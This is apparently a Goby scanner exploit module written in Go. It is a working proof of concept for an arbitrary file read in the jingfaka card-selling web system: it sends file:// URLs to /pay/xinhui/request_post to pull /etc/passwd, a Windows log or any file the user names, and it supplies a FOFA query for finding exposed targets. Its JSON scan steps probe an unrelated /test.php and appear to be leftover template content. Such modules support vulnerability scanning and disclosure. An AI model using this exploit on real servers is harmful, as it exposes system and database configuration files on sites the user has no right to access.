package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "jingfaka  /pay/xinhui/request_post Arbitrary File Read Vulnerability",
    "Description": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Product": "JingSoft",
    "Homepage": "https://www.jingfaka.com/",
    "DisclosureDate": "2024-07-16",
    "PostTime": "2024-07-18",
    "Author": "1538279017@qq.com",
    "FofaQuery": "body=\"/static/theme/maowang51/css/style.css\" && body=\"Loading Transition\"",
    "GobyQuery": "body=\"/static/theme/maowang51/css/style.css\" && body=\"Loading Transition\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>Do not allow user input to directly control file paths or names without validation. Sanitize input to remove special characters that could be used for path traversal attacks. Ensure that the application has appropriate file system permissions to read the files it accesses, and restrict access as much as possible.Awaiting Vendor Fix</p>",
    "References": [
        "https://github.com/wy876/POC/blob/3731c2067d80483223603737037eff2ed3c44425/%E9%B2%B8%E5%8F%91%E5%8D%A1%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%8A%A8%E5%8F%91%E5%8D%A1%E7%BD%91request_post%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md?plain=1#L8"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize,Windows",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.9",
    "Translation": {
        "CN": {
            "Name": "鲸发卡系统自动发卡网 /pay/xinhui/request_post/ 文件读取漏洞",
            "Product": "蓝鲸网络鲸发卡系统",
            "Description": "<p>鲸发卡系统致力于解决虚拟商品的快捷寄售服务，为商户及其买家 提供，便捷、绿色、安全、快速的销售和购买体验。本系统是由蓝鲸网络开发更新，技术团队强大，定制开发技术过硬，6年软件开发经验。系统由知宇二开，框架已升级TP最新版本，无安全BUG，重新开发将近80％，原创功能10+项，目前是商业发卡系统比较好用的系统。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞 2、通过防火墙等安全设备设置访问策略，设置白名单访问。3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "jingfaka  /pay/xinhui/request_post Arbitrary File Read Vulnerability",
            "Product": "JingSoft",
            "Description": "<p>Attackers&nbsp;can&nbsp;use&nbsp;this&nbsp;vulnerability&nbsp;to&nbsp;read&nbsp;important&nbsp;system&nbsp;files&nbsp;(such&nbsp;as&nbsp;database&nbsp;configuration&nbsp;files,&nbsp;system&nbsp;configuration&nbsp;files),&nbsp;database&nbsp;configuration&nbsp;files,&nbsp;etc.,&nbsp;resulting&nbsp;in&nbsp;an&nbsp;extremely&nbsp;insecure&nbsp;state&nbsp;of&nbsp;the&nbsp;website.<br></p>",
            "Recommendation": "<p>Do not allow user input to directly control file paths or names without validation. Sanitize input to remove special characters that could be used for path traversal attacks.<br> Ensure that the application has appropriate file system permissions to read the files it accesses, and restrict access as much as possible.<br>Awaiting Vendor Fix<br></p>",
            "Impact": "<p>Attackers&nbsp;can&nbsp;use&nbsp;this&nbsp;vulnerability&nbsp;to&nbsp;read&nbsp;important&nbsp;system&nbsp;files&nbsp;(such&nbsp;as&nbsp;database&nbsp;configuration&nbsp;files,&nbsp;system&nbsp;configuration&nbsp;files),&nbsp;database&nbsp;configuration&nbsp;files,&nbsp;etc.,&nbsp;resulting&nbsp;in&nbsp;an&nbsp;extremely&nbsp;insecure&nbsp;state&nbsp;of&nbsp;the&nbsp;website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10972"
}`

	postOrGet_fiejjifepu := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {

		//发送get请求
		//发送get请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/pay/xinhui/request_post?url=file://" + fileUrl + "&post_data[1]="
		resp, err := setGetRequest(hostInfo, path, map[string]string{})

		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),

		expJson,

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 此处需要修改：设置成功后的vulurl

			vulURL := "/pay/xinhui/request_post/"

			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件

			defaultModeMap := map[string]string{

				"/etc/passwd":               "root",
				"C:\\Windows\\setupact.log": "Windows",
			}

			// 函数继承

			uploadFileFunc := postOrGet_fiejjifepu

			// 请注意：后续代码为模板代码，非特殊情况，无需更改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			for fileUrl, fileText := range defaultModeMap {

				resp, err := uploadFileFunc(u, fileUrl)

				if err != nil {

					continue

				}

				if strings.Contains(resp, fileText) {

					// 设置VULURL

					ss.VulURL = u.HostInfo + vulURL

					return true

				}

			}

			return false

		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			var fileUrl string

			var fileText string

			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件

			defaultModeMap := map[string][2]string{

				"passwd":  {"/etc/passwd", "root"},
				"Windows": {"C:\\Windows\\setupact.log", "Windows"},
			}

			// 此处需要修改：函数继承

			uploadFileFunc := postOrGet_fiejjifepu

			// 请注意，后续代码为模板固化，正常情况下均无需修改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])

			} else {

				if _, ok := defaultModeMap[mode]; ok {

					fileUrl = defaultModeMap[mode][0]

					fileText = defaultModeMap[mode][1]

				} else {

					expResult.Success = false

					return expResult

				}

			}

			// 获取返回结果url和返回请求头

			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)

			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {

				expResult.Success = false

				return expResult

			}

			expResult.Success = true

			expResult.Output = "This is file content: \n" + resp

			return expResult

		},
	))

}
